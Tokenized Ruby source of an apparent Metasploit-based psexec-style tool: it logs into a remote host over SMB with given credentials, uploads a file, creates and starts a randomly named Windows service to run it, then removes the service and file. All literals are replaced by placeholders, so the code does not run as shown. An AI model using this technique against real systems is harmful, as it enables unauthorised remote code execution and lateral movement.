msfbase = __FILE__ while File . symlink? ( msfbase ) msfbase = File . expand_path ( File . readlink ( msfbase ) , File . dirname ( msfbase ) ) end $: . unshift ( File . expand_path ( File . join ( File . dirname ( msfbase ) , <str> , <str> , <str> ) ) ) require <str> $: . unshift ( ENV [ <str> ] ) if ENV [ <str> ] require <str> require <str> require <str> require <str> require <str> require <str> SIMPLE = Rex :: Proto :: SMB :: SimpleClient XCEPT = Rex :: Proto :: SMB :: Exceptions CONST = Rex :: Proto :: SMB :: Constants DCERPCPacket = Rex :: Proto :: DCERPC :: Packet DCERPCClient = Rex :: Proto :: DCERPC :: Client DCERPCResponse = Rex :: Proto :: DCERPC :: Response DCERPCUUID = Rex :: Proto :: DCERPC :: UUID NDR = Rex :: Encoder :: NDR def print_error ( msg ) $stderr . puts <str> msg <str> end def print_status ( msg ) $stderr . puts <str> msg <str> end def print_lines ( msg ) $stderr . puts <str> msg <str> end def usage $stderr . puts <str> $0 <str> exit ( <int> ) end def dcerpc_handle ( uuid , version , protocol , opts , rhost ) Rex :: Proto :: DCERPC :: Handle . new ( [ uuid , version ] , protocol , rhost , opts ) end def dcerpc_bind ( handle , csocket , csimple , cuser , cpass ) opts = { } opts [ <str> ] = <int> opts [ <str> ] = <int> opts [ <str> ] = cuser opts [ <str> ] = cpass opts [ <str> ] = <int> opts [ <str> ] = csimple Rex :: Proto :: DCERPC :: Client . new ( handle , csocket , opts ) end def dcerpc_call ( function , stub = <str> , timeout = nil , do_recv = true ) otimeout = dcerpc . options [ <str> ] begin dcerpc . options [ <str> ] = timeout if timeout dcerpc . call ( function , stub , do_recv ) rescue :: Rex :: Proto :: SMB :: Exceptions :: NoReply , Rex :: Proto :: DCERPC :: Exceptions :: NoResponse print_status ( <str> ) return ensure dcerpc . options [ <str> ] = otimeout end end opt_port = <int> opt_host = ARGV . shift ( ) || usage ( ) opt_path = ARGV . shift ( ) || usage ( ) opt_user = ARGV . shift ( ) || usage ( ) opt_pass = ARGV . shift ( ) || <str> opt_share = <str> opt_domain = <str> socket = Rex :: Socket . create_tcp ( { <str> = > opt_host , <str> = > opt_port . to_i } ) simple = Rex :: Proto :: SMB :: SimpleClient . new ( socket , opt_port . to_i == <int> ) simple . login ( Rex :: Text . rand_text_alpha ( <int> ) , opt_user , opt_pass , opt_domain ) simple . connect ( <str> opt_host <str> ) if ( not simple . client . auth_user ) print_line ( <str> ) print_error ( <str> + <str> + <str> + <str> ) print_line ( <str> ) exit ( <int> ) end fname = Rex :: Text . rand_text_alpha ( <int> ) + <str> sname = Rex :: Text . rand_text_alpha ( <int> ) print_status ( <str> ) simple . connect ( opt_share ) fd = simple . open ( <str> fname <str> , <str> , <int> ) File . open ( opt_path , <str> ) do | efd | fd << efd . read end fd . close print_status ( <str> fname <str> ) simple . disconnect ( opt_share ) simple . connect ( <str> ) handle = dcerpc_handle ( <str> , <str> , <str> , [ <str> ] , opt_host ) print_status ( <str> handle <str> ) dcerpc = dcerpc_bind ( handle , socket , simple , opt_user , opt_pass ) print_status ( <str> handle <str> ) print_status ( <str> ) scm_handle = nil stubdata = NDR . uwstring ( <str> opt_host <str> ) + NDR . long ( <int> ) + NDR . long ( <hex> ) begin response = dcerpc . call ( <hex> , stubdata ) if ( dcerpc . last_response != nil and dcerpc . last_response . stub_data != nil ) scm_handle = dcerpc . last_response . stub_data [ <int> , <int> ] end rescue :: Exception = > e print_error ( <str> e <str> ) return end file_location = <str> fname <str> displayname = <str> + Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) svc_handle = nil svc_status = nil print_status ( <str> sname <str> displayname <str> ) stubdata = scm_handle + NDR . wstring ( sname ) + NDR . uwstring ( displayname ) + NDR . long ( <hex> ) + NDR . long ( <hex> ) + NDR . long ( <hex> ) + NDR . long ( <hex> ) + NDR . wstring ( file_location ) + NDR . long ( <int> ) + NDR . long ( <int> ) + NDR . long ( <int> ) + NDR . long ( <int> ) + NDR . long ( <int> ) + NDR . long ( <int> ) + NDR . long ( <int> ) begin response = dcerpc . call ( <hex> , stubdata ) if ( dcerpc . last_response != nil and dcerpc . last_response . stub_data != nil ) svc_handle = dcerpc . last_response . stub_data [ <int> , <int> ] svc_status = dcerpc . last_response . stub_data [ <int> , <int> ] end rescue :: Exception = > e print_error ( <str> e <str> ) exit ( <int> ) end print_status ( <str> ) begin response = dcerpc . call ( <hex> , svc_handle ) rescue :: Exception end print_status ( <str> ) begin stubdata = scm_handle + NDR . wstring ( sname ) + NDR . long ( <hex> ) response = dcerpc . call ( <hex> , stubdata ) if ( dcerpc . last_response != nil and dcerpc . last_response . stub_data != nil ) svc_handle = dcerpc . last_response . stub_data [ <int> , <int> ] end rescue :: Exception = > e print_error ( <str> e <str> ) exit ( <int> ) end print_status ( <str> ) stubdata = svc_handle + NDR . long ( <int> ) + NDR . long ( <int> ) begin response = dcerpc . call ( <hex> , stubdata ) rescue :: Exception = > e print_error ( <str> e <str> ) exit ( <int> ) end print_status ( <str> ) stubdata = svc_handle begin response = dcerpc . call ( <hex> , stubdata ) if ( dcerpc . last_response != nil and dcerpc . last_response . stub_data != nil ) end rescue :: Exception = > e print_error ( <str> e <str> ) end print_status ( <str> ) begin response = dcerpc . call ( <hex> , svc_handle ) rescue :: Exception = > e print_error ( <str> e <str> ) end begin print_status ( <str> fname <str> ) select ( nil , nil , nil , <int> . <int> ) simple . connect ( smbshare ) simple . delete ( <str> fname <str> ) rescue :: Interrupt raise $! rescue :: Exception end 
